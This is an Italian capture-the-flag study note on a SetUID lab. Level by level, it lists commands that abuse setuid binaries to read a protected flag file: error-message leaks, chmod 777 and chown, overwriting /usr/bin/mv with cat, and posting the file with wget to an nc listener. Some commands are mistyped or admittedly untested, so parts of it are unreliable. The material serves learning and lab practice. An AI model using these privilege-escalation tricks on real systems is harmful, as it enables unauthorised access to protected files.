# SetUID

## Spiegazione come risolvere i problemi che richiedono di leggere con un comando specifico

+ Livello 1 cat file: cat legge e stampa qualsiasi cosa di cui abbia il permesso ```cat flag```

+ Livello 2 more file: more legge e stampa file su più righe tipo cat --> ```more flag```

+ Livello 3 less file: è un editor tipo vim --> ```less flag``` e ti apre l'editor

+ Livello 4 tail file: scrive le ultime 10 righe di un file, utile per vedere gli ultimi log nei file di log che vengono estesi o le ultime parte di un file --> ```tail flag```

+ Livello 5 head file: scrive le prime 10 righe di un file --> ```head flag```

+ Livello 6 sort [opzione] file: ordina le linee del file e stampa il risultato --> ```sort flag``

+ Livello 7 vim file: editor di testo, :q per uscire, :w per salvare, :wq salva ed esci, i inserisci, esc esce dalla parte di inserimento --> ```vim flag```

+ Livello 8 emacs file: editor di testo tipo vim, ctrl x + ctrl c per uscire --> ```emacs flag```

+ Livello 9 nano file: editor di testo tipo vim, ctrl x per uscire --> ```nano flag```

+ Livello 10 rev [option] file: inverte la posizione di ogni carattere in un file e lo stampa.  
La codifica invertita non vale come flag, quindi attraverso le pipe bisogna reinvertire il risultato del primo rev --> ```rev flag | rev```

+ Livello 11 od [-t carattere] [-A carattere] file: Stampa ciò che viene passato in input in formato ottale.  
Con l'opzione -t [carattere] si può impostare in che formato stampare al posto del formato ottale, mentre con l'opzione -A [carattere] si possono modificare i modi di stampare gli indici o altri valori  
--> Risoluzione che richiede del lavoro di copia e incolla ```od -t c -A n flag```.  
Risoluzione che elimina anche gli spazi attraverso l'uso di tr [-d] [caratteri] [file] (che sostituisce (o elimina usando -d) i caratteri indicati del file)  ```od -t c -A n flag | tr -d " " | tr -d "\n"```

+ Livello 12 hd [-h lunghezza] [-c] file: Stampa in formato esadecimale tutti i caratteri del file.  
Con l'opzione -h [lunghezza] si limitano i caratteri stampati, con l'opzione -c inserisce i caratteri in formato char sotto al rispettivo valore esadecimale --> ```hd flag```

+ Livello 13 xxd [-c numero] [-r] [-p] [-I numero] file: crea un immagine esadecimale di un file binario.  
Usando -c [numero] formatta le colonne inserendo n caratteri per linea.  
Usando -p viene semplificata la visualizzazione mentre -l [numero] limita il numero di byte scritto --> ```xxd -c 70 flag```

+ Livello 14 base32 [-d] file: codifica in base 32 un file passato.  
Con l'opzione -d decodifica il file in base 32 --> ```base32 flag | base32 -d```

+ Livello 15 base64 [-d] [flag]: codifica in base 64 un file passato.  
Con l'opzione -d decodifica il file in base 64  
--> ```base64 flag | base64 -d```

+ Livello 16 split [-d numero] [-b numero] [-l numero] file: suddivide un file in più file con nome uguale + un suffisso.  
Con -d [numero] definisci la dimensione del suffisso.  
Con -b [numero] [suffisso] indica la dimensione in byte di ciascun file  
Con -l [numero] indica la dimensione in linee. -->  

```sh
split flag 
cat xaa (xaa è il primo nome che viene dato di default)
```  

+ Livello 17 gzip [-c] [-d] [-k] [-N] file: zippa e unzippa il file in modalità gzip.  
Con -c stampa in stdout  
Con -d decomprime  
Con -k mantiene anche il file zippato  
Con -N salva o modifica il nome del file -->

```sh
gzip flag
gzip -d -c flag.gz
```

+ Livello 18 bzip2/bunzip2/bzcat [-c] [-d] file: zippa e unzippa il file con un block sorting.  
bzip2 comprime, bunzip2 decomprime, bzcat decomprime e stampa.
Con -c stampa in stdout, con -d forza la decompressione -->

```sh
bzip2 flag
bzip2 -d -c flag.bz2
```

+ Livello 19 zip dove file: inserisce in un file .zip qualsiasi file, creandolo in caso non ci sia -->

```sh
zip z flag
cat z.zip
```

+ Livello 20 tar [cf/tf/xf] nome [opzioni] file: tar crea un insieme di sottocartelle collegate e zippate partendo anche da dei semplici file.  
Tar cf [nome] [pattern] crea un file tar  
Tar tf [nome] elenca il contenuto, con l'opzione v per vedere i permessi
Ter xf [nome] per estrarre -->  

```sh
tar cf nou flag
tar xf nou -O
```

+ Livello 21 ar [opzione] nomeArchivio file: crea un archivio, ovvero un insie,e di file raccolti in un solo file.  
Opzioni: -q crea un nuovo archivio, -d cancella un file, -m sposta, -p stampa il contenuto dei file, -t stampa il contenuto dell'archivio, -x estrae i file -->

```sh
ar -q nuovo flag
ar -p nuovo flag
```

+ Livello 22 cpio [opzione]: copia i file e fa qualcosa ma non so
Funziona con ```sh cpio -o``` e poi scrivere flag oppure con ```sh echo "/flag" | cpio -o```

+ Livello 23 genisoimage [options] -o file directory: crea un immagine iso nella directory indicata. Si usa con --> ```sh genisoimage -sort flag```

+ Livello 24 env [qualsiasi cosa]: visualizza l'ambiente corrente, oppure inserendo un comando successivo lo esegue in un ambiente virtuale in cui puoi fare tutto con pieni permessi --> ```sh env cat flag```

+ Livello 25 find path dove cercare [tipo parametro] [parametro] ... [comando] {} \;: find è un comando che di base ti permette di trovare uno o più elementi a seconda della query passatagli.  
Tipo parametro accetta -name, -user, -perm (esempio 777), -size, -type e possono essere concatenati con -and, -or.  
Successivamente accetta un comando che viene applicato, con apposita domanda, a tutti gli elementi trovati. Senza comando stampa la lista di elemnti trovati --> ```sh find ./ -name flag exec chmod 777 {} \;``` (poi esegui il comando o cat flag)

+ Livello 26 make [opzioni] file: unisce vari file. Non riusciti

+ Livello 27 nice [-n valore] [comando]: permette di vedere il niceness o di eseguire un comando modificandone la niceness, più è alto più tempo ci metterà il processo ad essere eseguito --> ```sh nice cat flag```

+ Livello 28 timeout [opzione] durata comando: esegue il comando e lo killa se non termina entro il tempo prestabilito --> ```sh timeout 100 cat flag```

+ Livello 29 stdbuf opzione comando: esegue il comando settandogli un buffer di input/output diverso. Le opzioni sono -i per l'input, -o per l'output, -e per l'error seguiti dalla modalità (L per output e 0 per input).  
Funziona sia con ```sh stdbuf -i 0 cat flag``` che con ```sh stdbuf -o L cat flag```

+ Livello 30 setarch architettura [opzioni] comando: setta un architettura (sceglibile tra quelle proposte da setarch --list) ed esegue il comando --> ```sh setarch linux32 cat flag```

+ Livello 31 watch [opzioni] comando: esegue a ripetizione il comando passato usando sh -c per l'esecuzione, oppure exec se c'è l'opzione -x --> ```sh watch -x cat flag```

+ Livello 32 socat [opzioni] indirizzo indirizzo: invia pacchetti da un indirizzo all'altro.  
L'opzione -v permette di stampare i pacchetti. Ricordarsi di passare il path come indirizzo e non il programma vero e proprio --> ```sh socat -v /flag /flag```

+ Livello 33 whiptail [opzioni] input [misure]: crea dei box di input/output a seconda dell'opzioine datagli --> ```sh whiptail --textbox flag 20 60```

+ Livello 34 awk [opzioni] regex file: cerca e stampa quello che trova in un file o in un programma --> ```sh awk 'length>1' flag```

+ Livello 35 sed [option] script [input]: esegue gli script inseriti, ma non ho ben capito quali sono le opzioni che le fanno muovere --> ```sh sed e flag```

+ Livello 36 ed [opzioni] [file]: editor ma non so come farlo funzionare

+ Livello 37 chown [opzioni] nuovo_owner file: modifica chi possiede il file --> ```sh chown hacker flag``` e poi posso usare cat senza problemi

+ Livello 38 chmod [opzioni] mode file: modifica i permessi del file --> ```sh chmod 777 flag``` e poi posso aprire flag senza problemi

+ Livello 39 cp [opzioni] source destinazione: copia il contenuto in un altra posizione. Il trick qua è copiarlo in stdout che stampa a schermo --> ```sh cp flag /dev/stdout```

+ Livello 40 mv source destinazione: mv permette di spostare ogni cosa da un posto ad un altro.  
Il trick è abbastanza complesso, prima sposto cat dentro la cartella di mv, sostituendola, poi richiama la challenge per dare i permessi ad mv trasformato in cat, che diventa libero di agire --> ```sh mv /usr/bin/cat /usr/bin/mv```, poi richiamo la challenge, quindi ```sh mv flag```

+ Livello 41 perl [opzioni] [cose] [altre cose]: linguaggio di programmazione, permette di eseguire file inline usando -e --> ```sh pearl -n -e print flag```

+ Livello 42 python: linguaggio di programmazione. O scrivi un programma che printa flag (avendo i privilegi puoi farlo) oppure usi degli errori facendogli provare a trasformare la flag in un file python --> ```sh python /flag nomefile.py```

+ Livello 43 ruby: linguaggio di programmazione. Sfrutto il fatto che stampi il contenuto dei file che stiamo cercando di aprire se non li riconosce come ruby --> ```sh ruby /flag```

+ Livello 44 bash: sfrutto gli errori di far eseguire flag come comando bash --> ```sh bash -p /flag```

+ Livello 45 date [opzione] formato: visualizza la data in un dato formato. Sfruttiamo l'errore che viene stampato quando usiamo l'opzione -f che richiede una stringa datestamp da stampare --> ```sh date -f /flag```

+ Livello 46 dmesg [opzioni]: mostra il buffer del kernel ring o di un file con l'opzione -F --> ```sh dmesg --help```

+ Livello 47 wc [opzione] [file]: conta righe, parole e byte dei file passati e stampa il numero. Sfruttando --files0-from che legge l'input dal file passato possiamo ottenere la flag stampata per spiegare l'errore --> ```sh wc --files0-from=/flag```

+ Livello 48 gcc [opzioni] file: è il compilatore per eccellenza. Attraverso l'opzione -x possiamo decidere a priori il linguaggio e non farglielo capire attraverso il tipo del file passato e quindi stampare errori di compilazione e non di tipologia --> ```sh gcc -x c /flag```

+ Livello 49 as [apzioni] file_asm: compilatore asm. Se gli passiamo un file prova a compilarlo. Funziona stampando l'errore della riga che non riconosce come codice --> ```sh as /flag```

+ Livello 50 wget [opzioni] [indirizzo]: è un gestore di network che permette di inviare e ricevere millemila cose.  
Il processo di ottenimento è abbastana complesso. Necessito di avviare localhost, facendo --> ```sh nc -lp 80``` (80 è la porta default di localhost), poi di aprire un secondo terminale, di rifare la procedura della challenge ed inviare attraverso wget il file flag al localhost del primo terminale che lo stamperà, facendo --> ```sh wget --post-file=/flag http://localhost```

+ Livello 51 ssh-keygen ma non so come farlo
